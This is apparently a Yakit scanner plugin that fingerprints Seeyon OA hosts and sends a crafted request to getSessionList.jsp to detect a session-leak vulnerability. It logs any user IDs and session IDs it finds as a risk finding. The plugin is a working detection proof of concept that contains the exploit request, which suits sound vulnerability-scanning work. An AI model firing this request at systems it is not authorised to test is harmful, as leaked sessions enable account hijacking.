# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(string(rsp),"<usrID>") && str.MatchAllOfSubString(string(rsp),"<sessionID>"){
            yakit.Info("%v found Seeyon OA Session Leak Vulnerability ", addr)
            risk.NewRisk(
            addr,risk.title("Seeyon OA Session Leak"),
            risk.severity("medium"),
            risk.titleVerbose("致远OA Session 泄露漏洞"),
            risk.type("InfoLeak[Seeyon OA]"),
            risk.payload(`/yyoa/ext/https/getSessionList.jsp?cmd=getAll`),
            risk.details({
                "target":addr,
                "request":req,
                "response":rsp,
            }),
        )
        }

    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    // println(result.Fingerprint.CPEs)
    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.Fingerprint.CPEs, "seeyon"){
            handleCheck(result.Target,result.Port)
        }

    }

}
